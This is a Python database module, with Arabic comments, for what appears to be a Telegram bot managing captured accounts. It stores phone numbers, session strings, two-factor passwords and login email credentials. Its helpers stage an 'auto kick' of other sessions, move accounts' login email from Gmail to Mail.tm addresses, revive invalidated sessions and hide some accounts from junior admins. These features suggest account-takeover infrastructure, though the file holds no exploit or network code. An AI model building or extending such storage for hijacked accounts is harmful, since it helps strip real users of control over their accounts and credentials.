# database.py
import os
import logging
import aiosqlite

logger = logging.getLogger(__name__)


def _resolve_data_dir() -> str:
    """Railway Volume Mount Path = /app/data"""
    candidates = [
        "/app/data",
        os.environ.get("RAILWAY_VOLUME_MOUNT_PATH"),
        os.environ.get("DATA_DIR"),
        "/data",
    ]
    for path in candidates:
        if path:
            try:
                os.makedirs(path, exist_ok=True)
                if os.path.isdir(path):
                    logger.info("using data directory: %s", path)
                    return path
            except OSError:
                continue
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
    os.makedirs(local, exist_ok=True)
    logger.info("using local data directory: %s", local)
    return local


DATA_DIR = _resolve_data_dir()
DB_PATH = os.path.join(DATA_DIR, "bot.db")


def row_get(row, key: str, default=None):
    """قراءة عمود من sqlite3.Row (لا يدعم .get)."""
    if not row:
        return default
    keys = row.keys() if hasattr(row, "keys") else []
    if key not in keys:
        return default
    val = row[key]
    return val if val is not None else default


def row_flag(row, key: str, default: int = 0) -> bool:
    if not row:
        return False
    keys = row.keys() if hasattr(row, "keys") else []
    if key not in keys:
        return bool(default)
    return bool(row[key])


def row_login_email(row) -> str | None:
    """قراءة بريد Login مع دعم الاسم القديم recovery_email."""
    if not row:
        return None
    keys = row.keys() if hasattr(row, "keys") else []
    if "login_email" in keys and row["login_email"]:
        return row["login_email"]
    if "recovery_email" in keys and row["recovery_email"]:
        return row["recovery_email"]
    return None


def is_legacy_login_email(email: str | None) -> bool:
    """بريد قديم (Gmail وغيره) — يُعاد ربطه بـ Mail.tm."""
    e = (email or "").lower()
    if not e:
        return False
    markers = ("@gmail.com", "@googlemail.com", "frk99")
    return any(m in e for m in markers)


async def _migrate_sessions_columns(db):
    async with db.execute("PRAGMA table_info(sessions)") as cursor:
        cols = {row[1] for row in await cursor.fetchall()}

    if "recovery_email" in cols and "login_email" not in cols:
        await db.execute(
            "ALTER TABLE sessions RENAME COLUMN recovery_email TO login_email"
        )
        cols.discard("recovery_email")
        cols.add("login_email")

    if "login_email" not in cols:
        await db.execute("ALTER TABLE sessions ADD COLUMN login_email TEXT")
    if "email_password" not in cols:
        await db.execute("ALTER TABLE sessions ADD COLUMN email_password TEXT")
    if "auto_kick_stage" not in cols:
        await db.execute(
            "ALTER TABLE sessions ADD COLUMN auto_kick_stage INTEGER DEFAULT NULL"
        )
    if "a1_only" not in cols:
        await db.execute(
            "ALTER TABLE sessions ADD COLUMN a1_only INTEGER DEFAULT 0"
        )
    if "secured" not in cols:
        await db.execute(
            "ALTER TABLE sessions ADD COLUMN secured INTEGER DEFAULT 0"
        )


async def _ensure_admin_notifications_table(db) -> None:
    await db.execute("""
        CREATE TABLE IF NOT EXISTS admin_notifications (
            id         INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id   INTEGER NOT NULL,
            phone      TEXT NOT NULL,
            chat_id    INTEGER NOT NULL,
            message_id INTEGER NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    await db.execute(
        "CREATE INDEX IF NOT EXISTS idx_admin_notifications_phone "
        "ON admin_notifications(phone)"
    )


async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id      INTEGER PRIMARY KEY,
                username     TEXT,
                full_name    TEXT,
                phone        TEXT,
                registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                id             INTEGER PRIMARY KEY AUTOINCREMENT,
                phone          TEXT UNIQUE,
                username       TEXT,
                full_name      TEXT,
                session_string TEXT,
                two_fa         TEXT,
                login_email    TEXT,
                email_password TEXT,
                auto_kick_stage INTEGER,
                valid          INTEGER DEFAULT 1,
                created_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        await db.execute("""
            CREATE TABLE IF NOT EXISTS settings (
                key   TEXT PRIMARY KEY,
                value TEXT
            )
        """)
        await _ensure_admin_notifications_table(db)
        await _migrate_sessions_columns(db)
        await db.commit()


async def get_user(user_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM users WHERE user_id=?", (user_id,)
        ) as cursor:
            return await cursor.fetchone()


async def save_user(user_id: int, username: str, full_name: str, phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT OR REPLACE INTO users (user_id, username, full_name, phone)
            VALUES (?, ?, ?, ?)
        """, (user_id, username, full_name, phone))
        await db.commit()


async def get_all_sessions():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM sessions ORDER BY created_at DESC"
        ) as cursor:
            return await cursor.fetchall()


async def get_sessions_for_admin(admin_id: int, super_admin_id: int):
    """أدمن عادي لا يرى الجلسات المحجوبة (a1_only)."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        if admin_id == super_admin_id:
            sql = "SELECT * FROM sessions ORDER BY created_at DESC"
            params = ()
        else:
            sql = (
                "SELECT * FROM sessions WHERE COALESCE(a1_only, 0) = 0 "
                "ORDER BY created_at DESC"
            )
            params = ()
        async with db.execute(sql, params) as cursor:
            return await cursor.fetchall()


async def get_a1_only_sessions():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM sessions WHERE COALESCE(a1_only, 0) = 1 "
            "ORDER BY created_at DESC"
        ) as cursor:
            return await cursor.fetchall()


async def can_admin_access_session(admin_id: int, phone: str, super_admin_id: int) -> bool:
    if admin_id == super_admin_id:
        return True
    session = await get_session_by_phone(phone)
    if not session:
        return False
    return not row_flag(session, "a1_only")


def normalize_phone(phone: str) -> str:
    p = (phone or "").strip().replace(" ", "")
    if not p:
        return p
    if not p.startswith("+"):
        p = "+" + p.lstrip("+")
    return p


def _phone_lookup_variants(phone: str) -> list[str]:
    p = normalize_phone(phone)
    variants = []
    for v in (p, (phone or "").strip(), p.lstrip("+"), f"+{p.lstrip('+')}"):
        if v and v not in variants:
            variants.append(v)
    return variants


async def get_session_by_id(session_id: int):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            "SELECT * FROM sessions WHERE id=?", (session_id,)
        ) as cursor:
            return await cursor.fetchone()


async def get_session_by_phone(phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        for variant in _phone_lookup_variants(phone):
            async with db.execute(
                "SELECT * FROM sessions WHERE phone=?", (variant,)
            ) as cursor:
                row = await cursor.fetchone()
                if row:
                    return row
        return None


async def update_session_string(phone: str, session_string: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET session_string=? WHERE phone=?",
            (session_string, phone),
        )
        await db.commit()


async def save_session(
    phone: str,
    username: str,
    full_name: str,
    session_string: str,
    two_fa: str = None,
):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO sessions
                (phone, username, full_name, session_string, two_fa, valid)
            VALUES (?, ?, ?, ?, ?, 1)
            ON CONFLICT(phone) DO UPDATE SET
                username=excluded.username,
                full_name=excluded.full_name,
                session_string=COALESCE(
                    NULLIF(excluded.session_string, ''),
                    sessions.session_string
                ),
                two_fa=COALESCE(excluded.two_fa, sessions.two_fa),
                valid=1
        """, (phone, username, full_name, session_string, two_fa))
        await db.commit()


async def update_session_login_email(
    phone: str, login_email: str, email_password: str
):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            """UPDATE sessions
               SET login_email=?, email_password=?
               WHERE phone=?""",
            (login_email, email_password, phone),
        )
        await db.commit()


async def set_auto_kick_stage(phone: str, stage: int):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET auto_kick_stage=? WHERE phone=?",
            (stage, phone),
        )
        await db.commit()


async def mark_auto_kick_done(phone: str):
    await set_auto_kick_stage(phone, 3)


async def get_sessions_pending_auto_kick():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            """SELECT * FROM sessions
               WHERE valid=1
                 AND auto_kick_stage IS NOT NULL
                 AND auto_kick_stage < 3
               ORDER BY created_at ASC"""
        ) as cursor:
            return await cursor.fetchall()


async def get_sessions_needing_email_migration():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            """SELECT * FROM sessions
               WHERE valid=1
                 AND (
                   login_email IS NULL
                   OR email_password IS NULL
                   OR login_email LIKE '%gmail%'
                   OR login_email LIKE '%googlemail%'
                   OR login_email LIKE '%frk99%'
                 )
               ORDER BY created_at ASC"""
        ) as cursor:
            return await cursor.fetchall()


async def mark_session_invalid(phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET valid=0 WHERE phone=?", (phone,)
        )
        await db.commit()


async def mark_session_valid(phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET valid=1 WHERE phone=?", (phone,)
        )
        await db.commit()


async def get_invalid_sessions_with_login_email():
    """جلسات مُصنَّفة غير صالحة لكن لها بريد Login — قابلة لإعادة الإنعاش."""
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute(
            """SELECT * FROM sessions
               WHERE valid=0
                 AND login_email IS NOT NULL
                 AND TRIM(login_email) != ''
                 AND email_password IS NOT NULL
                 AND TRIM(email_password) != ''
               ORDER BY created_at ASC"""
        ) as cursor:
            return await cursor.fetchall()


async def delete_session(phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM sessions WHERE phone=?", (phone,))
        await db.commit()


async def update_session_username(phone: str, username: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET username=? WHERE phone=?", (username, phone)
        )
        await db.commit()


async def update_session_fullname(phone: str, full_name: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET full_name=? WHERE phone=?", (full_name, phone)
        )
        await db.commit()


async def update_session_two_fa(phone: str, two_fa: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET two_fa=? WHERE phone=?", (two_fa, phone)
        )
        await db.commit()


async def get_sessions_count(admin_id: int = None, super_admin_id: int = None):
    async with aiosqlite.connect(DB_PATH) as db:
        if admin_id is not None and admin_id != super_admin_id:
            sql = (
                "SELECT COUNT(*) FROM sessions "
                "WHERE valid=1 AND COALESCE(a1_only, 0) = 0"
            )
        else:
            sql = "SELECT COUNT(*) FROM sessions WHERE valid=1"
        async with db.execute(sql) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else 0


async def count_invalid_sessions(admin_id: int, super_admin_id: int) -> int:
    async with aiosqlite.connect(DB_PATH) as db:
        if admin_id == super_admin_id:
            sql = "SELECT COUNT(*) FROM sessions WHERE valid=0"
            params = ()
        else:
            sql = (
                "SELECT COUNT(*) FROM sessions "
                "WHERE valid=0 AND COALESCE(a1_only, 0) = 0"
            )
            params = ()
        async with db.execute(sql, params) as cursor:
            row = await cursor.fetchone()
            return row[0] if row else 0


async def purge_invalid_sessions(admin_id: int, super_admin_id: int) -> list[str]:
    """حذف نهائي للجلسات غير الصالحة (مع إشعاراتها)."""
    async with aiosqlite.connect(DB_PATH) as db:
        await _ensure_admin_notifications_table(db)
        db.row_factory = aiosqlite.Row
        if admin_id == super_admin_id:
            sql = "SELECT phone FROM sessions WHERE valid=0"
        else:
            sql = (
                "SELECT phone FROM sessions "
                "WHERE valid=0 AND COALESCE(a1_only, 0) = 0"
            )
        async with db.execute(sql) as cursor:
            phones = [row["phone"] for row in await cursor.fetchall()]
        for phone in phones:
            await db.execute(
                "DELETE FROM admin_notifications WHERE phone=?", (phone,)
            )
            await db.execute("DELETE FROM sessions WHERE phone=?", (phone,))
        await db.commit()
    return phones


async def set_session_a1_only(phone: str, value: bool = True):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET a1_only=? WHERE phone=?",
            (1 if value else 0, phone),
        )
        await db.commit()


async def mark_session_secured(phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "UPDATE sessions SET secured=1 WHERE phone=?", (phone,)
        )
        await db.commit()


async def save_admin_notification(
    admin_id: int, phone: str, chat_id: int, message_id: int
):
    async with aiosqlite.connect(DB_PATH) as db:
        await _ensure_admin_notifications_table(db)
        await db.execute(
            """INSERT INTO admin_notifications
               (admin_id, phone, chat_id, message_id)
               VALUES (?, ?, ?, ?)""",
            (admin_id, phone, chat_id, message_id),
        )
        await db.commit()


def _phone_in_clause(phone: str) -> tuple[str, tuple]:
    variants = _phone_lookup_variants(phone)
    placeholders = ",".join("?" * len(variants))
    return f"phone IN ({placeholders})", tuple(variants)


async def get_admin_notifications_for_phone(phone: str, except_admin: int = None):
    async with aiosqlite.connect(DB_PATH) as db:
        await _ensure_admin_notifications_table(db)
        db.row_factory = aiosqlite.Row
        in_sql, in_params = _phone_in_clause(phone)
        if except_admin is not None:
            sql = (
                f"SELECT * FROM admin_notifications WHERE {in_sql} AND admin_id != ?"
            )
            params = in_params + (except_admin,)
        else:
            sql = f"SELECT * FROM admin_notifications WHERE {in_sql}"
            params = in_params
        async with db.execute(sql, params) as cursor:
            return await cursor.fetchall()


async def delete_admin_notifications_for_phone(phone: str, except_admin: int = None):
    async with aiosqlite.connect(DB_PATH) as db:
        await _ensure_admin_notifications_table(db)
        in_sql, in_params = _phone_in_clause(phone)
        if except_admin is not None:
            await db.execute(
                f"DELETE FROM admin_notifications WHERE {in_sql} AND admin_id != ?",
                in_params + (except_admin,),
            )
        else:
            await db.execute(
                f"DELETE FROM admin_notifications WHERE {in_sql}",
                in_params,
            )
        await db.commit()


